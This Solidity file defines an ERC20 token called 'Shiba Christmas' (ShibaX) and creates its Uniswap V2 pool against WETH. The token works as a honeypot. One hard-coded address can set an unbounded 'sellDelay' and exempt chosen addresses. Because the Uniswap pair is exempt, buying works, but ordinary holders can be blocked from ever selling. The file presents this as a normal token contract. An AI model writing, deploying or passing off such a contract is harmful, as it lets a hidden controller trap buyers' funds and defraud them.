//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./interfaces/IUniswapV2.sol";


contract ShibaX is ERC20 {

    mapping(address => uint256) public lastBuy;
    uint256 public sellDelay;
    mapping(address => bool) public excludedFromDelay;

    constructor() ERC20("Shiba Christmas", "ShibaX") {
        _mint(msg.sender, 21_000_000 * 10 ** 18);

        // Create a uniswap pair for this new token
        address uniswapV2Pair = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f) //Uni V2
        .createPair(address(this),0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);//Uni V2 WETH
        excludedFromDelay[uniswapV2Pair] = true;
    }


    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (!excludedFromDelay[sender]) {
            require(lastBuy[sender] + sellDelay < block.timestamp, "Too early");
        }
        lastBuy[recipient] = block.timestamp;
        super._transfer(sender,recipient,amount);
    }

    function setDelay(uint256 _newDelay) public {
        require(msg.sender == 0xDde9284E3d965F62b9Af347c8F97E3A62EDC1F7C);
        sellDelay = _newDelay;
    }

    function setExcluded(address addr, bool status) public {
        require(msg.sender == 0xDde9284E3d965F62b9Af347c8F97E3A62EDC1F7C);
        excludedFromDelay[addr] = status;
    }
}